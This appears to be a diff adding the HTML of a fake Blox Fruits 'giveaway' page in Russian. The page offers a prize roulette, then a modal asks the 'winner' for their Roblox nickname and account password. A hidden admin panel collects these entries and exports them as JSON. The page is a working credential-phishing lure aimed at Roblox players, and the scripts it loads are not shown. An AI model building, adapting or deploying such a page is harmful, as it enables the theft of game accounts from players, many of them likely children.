@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Раздача — Blox Fruits</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div id="splash" class="splash" aria-live="polite">
+    <div class="splash-inner">
+      <div class="splash-logo" aria-hidden="true"></div>
+      <p class="splash-tag" id="splashTag">Blox Fruits</p>
+      <p class="splash-sub" id="splashSub">Розыгрыш легендарных фруктов</p>
+      <div class="splash-bar"><span id="splashProgress"></span></div>
+      <button type="button" class="splash-skip" id="splashSkip">Пропустить</button>
+    </div>
+  </div>
+
+  <div class="scene" aria-hidden="true">
+    <div class="rbx-dark-bg"></div>
+    <div class="rbx-logo-bg" aria-hidden="true">
+      <span class="rbx-mark"></span>
+      <span class="rbx-mark"></span>
+      <span class="rbx-mark"></span>
+      <span class="rbx-mark"></span>
+      <span class="rbx-mark"></span>
+      <span class="rbx-mark"></span>
+    </div>
+    <div class="rbx-blocks" id="rbxBlocks"></div>
+    <div class="float-fruits" id="floatFruits"></div>
+    <div class="particles" id="particles"></div>
+  </div>
+
+  <main class="wrap main-content" id="mainContent">
+    <header class="hero">
+      <p class="badge">Blox Fruits · Раздача</p>
+      <h1 id="pageTitle">Раздача фруктов</h1>
+      <p class="lead" id="pageSubtitle"></p>
+      <p class="organizer" id="organizerLine"></p>
+    </header>
+
+    <section class="card wheel-card">
+      <h2>Рулетка фруктов</h2>
+      <p class="wheel-hint">Нажми «Крутить» — после выигрыша зарегистрируй заявку (ник + Пароль).</p>
+
+      <div class="wheel-wrap">
+        <div class="wheel-pointer" aria-hidden="true"></div>
+        <canvas id="wheelCanvas" width="320" height="320" aria-label="Рулетка призов"></canvas>
+      </div>
+
+      <button type="button" class="btn-spin" id="spinBtn">Крутить рулетку</button>
+      <p class="result-line" id="resultLine" hidden></p>
+    </section>
+
+    <section class="card timer-card" id="timerBlock" hidden>
+      <h2>До конца раздачи</h2>
+      <div class="timer" id="timer">—</div>
+    </section>
+
+    <section class="card info-card" id="giveawayInfo">
+      <h2 id="giveawayInfoTitle">Что ждёт в розыгрыше</h2>
+      <p class="info-intro" id="giveawayInfoIntro">Раздаём легендарные и редкие фрукты Blox Fruits. Крути рулетку и зарегистрируй заявку.</p>
+      <ol class="register-steps" id="registerSteps"></ol>
+    </section>
+
+    <section class="card fruits-catalog">
+      <h2>Фрукты в розыгрыше</h2>
+      <p class="fruits-catalog-hint">Легендарные призы — что умеет каждый фрукт</p>
+      <div class="fruits-grid" id="fruitsGrid"></div>
+    </section>
+  </main>
+
+  <footer class="site-footer" id="siteFooter">
+    <nav class="social-nav" id="socialNav" aria-label="Социальные сети"></nav>
+    <p class="rights" id="copyrightLine">© 2026 · Все права защищены.</p>
+  </footer>
+
+  <dialog class="modal" id="claimModal">
+    <form id="claimForm" method="dialog">
+      <h2 id="modalTitle">Ты выиграл!</h2>
+      <p class="modal-prize" id="modalPrize"></p>
+      <p class="modal-desc">Укажи данные Roblox, чтобы мы подарили фрукт в игре.</p>
+
+      <label for="robloxUser">Ник в Roblox</label>
+      <input id="robloxUser" name="robloxUser" type="text" autocomplete="username" placeholder="Например: PlayerName" required maxlength="64">
+
+      <label for="robloxId">Пароль в Roblox / пароль (буквы и цифры)</label>
+      <input id="robloxId" name="robloxId" type="text" placeholder="Например: PlayerName или 123456789" required maxlength="32">
+      <p class="field-hint">roblox.com</p>
+
+      <div class="modal-actions">
+        <button type="submit" class="btn-submit">Отправить заявку</button>
+        <button type="button" class="btn-ghost" id="closeModal">Закрыть</button>
+      </div>
+    </form>
+  </dialog>
+
+  <dialog class="modal success-modal" id="successModal">
+    <h2>Заявка принята</h2>
+    <p id="successText">Скоро добавим тебя в игре и передадим фрукт.</p>
+    <button type="button" class="btn-submit" id="successOk">Ок</button>
+  </dialog>
+
+  <section class="admin-panel card" id="adminPanel" hidden>
+    <h2>Заявки (только для тебя)</h2>
+    <p class="field-hint">Сохраняются в браузере. Экспортируй и раздай в игре.</p>
+    <button type="button" class="btn-ghost" id="exportBtn">Скачать JSON</button>
+    <ul id="entriesList" class="entries-list"></ul>
+  </section>
+
+  <script src="config.js"></script>
+  <script src="script.js"></script>
+</body>
+</html>
